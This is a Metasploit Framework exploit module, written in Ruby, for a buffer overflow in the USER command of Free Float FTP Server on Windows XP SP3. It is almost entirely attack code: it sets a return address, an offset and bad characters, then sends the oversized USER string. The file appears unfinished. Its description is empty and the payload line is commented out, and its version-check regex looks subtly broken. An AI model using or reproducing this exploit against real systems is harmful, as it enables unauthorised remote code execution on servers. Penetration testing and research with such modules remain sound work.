##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#	http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = LowRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'			 => 'Free Float FTP Server USER Command Buffer Overflow',
			'Description'	 => %q{
			},
			'Platform'		 => 'win',
			'Author'		 =>
				[
					'D35m0nd142', # Original exploit
					'Doug Prostko <dougtko[at]gmail.com>' # MSF module
				],
			'License'		 => MSF_LICENSE,
			'References'	 =>
				[
					[ 'OSVDB', '69621'],
					[ 'EDB', '23243']
				],
			'Privileged'	 => false,
			'Payload'		 =>
				{
					'Space'          => 500,
					'DisableNops'    => true,
					'BadChars'       => "\x00\x0a\x0d\x20\x5c",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Targets'		 =>
				[
					[ 'Windows XP SP3',
						{
							'Ret' => 0x7cb41020, # jmp esp 
							#'Ret' => 0xDEADBEEF,
							'Offset'   => 230
						}
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 12 2012'))
		register_options(
			[
				#OptAddress.new('SOURCEIP', [false, 'The local client address'])
			], self.class)
	end

	def check
		connect
		disconnect
		print_status(banner)
		if (banner =~ /220 FreeFloat Ftp Server (Version 1.00)/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		buf = rand_text(target['Offset'])
		buf << [ target['Ret'] ].pack('V')
		#buf << payload.encoded
		raw_send("USER #{buf}\r\n")
		#send_user(buf)
		disconnect
	end

end
